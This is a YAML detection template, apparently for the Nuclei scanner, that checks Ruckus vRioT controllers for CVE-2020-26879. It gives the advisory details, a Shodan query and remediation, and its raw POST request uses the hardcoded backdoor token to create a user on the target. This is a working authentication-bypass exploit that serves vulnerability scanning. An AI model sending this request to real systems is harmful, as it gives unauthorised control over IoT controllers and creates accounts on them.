http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{"ok": 1}'
    - '{"message":'
  - negative: true
    part: body
    type: word
    words:
    - Invalid JSON
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /service/v1/createUser HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Authorization: OlDkR+oocZg=


    {"username": "{{username}}", "password": "{{password}}"}

    '
id: CVE-2020-26879
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:commscope:ruckus_vriot:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-26879
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
    epss-percentile: 0.99463
    epss-score: 0.88286
  description: 'Ruckus vRioT through 1.5.1.0.21 contains an API backdoor caused by
    a hardcoded token in validate_token.py,letting unauthenticated attackers interact
    with the API without authentication.

    '
  impact: 'Unauthenticated attackers can interact with the API without authentication
    via a hardcoded token, allowing complete control over the IoT controller and connected
    devices.

    '
  metadata:
    max-request: 1
    product: ruckus_vriot
    shodan-query: html:"RIoT Controller"
    vendor: commscope
    verified: true
  name: Ruckus vRioT IoT Controller - Authentication Bypass
  reference:
  - https://adepts.of0x.cc/ruckus-vriot-rce/
  - https://adepts.of0x.cc
  - https://twitter.com/TheXC3LL
  - https://x-c3ll.github.io
  - https://github.com/alphaSeclab/sec-daily-2020
  - https://nvd.nist.gov/vuln/detail/CVE-2020-26879
  remediation: 'Update to Ruckus vRioT version 1.5.1.0.22 or later.

    '
  severity: critical
  tags: cve,cve2020,ruckus,vriot,iot,api,backdoor,auth-bypass,vkev,vuln
variables:
  password: '{{randstr_2}}'
  username: '{{randstr_1}}'
